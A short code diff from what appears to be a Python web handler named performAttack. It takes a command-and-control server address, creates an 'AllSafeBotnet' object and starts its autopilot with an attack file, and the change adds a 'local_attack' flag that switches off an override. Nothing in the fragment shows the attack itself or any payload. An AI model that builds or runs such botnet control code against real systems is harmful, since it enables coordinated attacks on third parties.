@@ -60,7 +60,10 @@ def performAttack():
             if '://' not in cc_server:
                 cc_server = 'http://' + cc_server
             allsafe = Botnet.AllSafeBotnet()
-            allsafe.autopilot(cc_server, './data/current_attack.json', 5, override=True)
+            if ('local_attack' not in request.json):
+                allsafe.autopilot(cc_server, './data/current_attack.json', 5, override=True)
+            else:
+                allsafe.autopilot(cc_server, './data/current_attack.json', 5, override=False)
             print("done")
             return "OK", 200
         else:
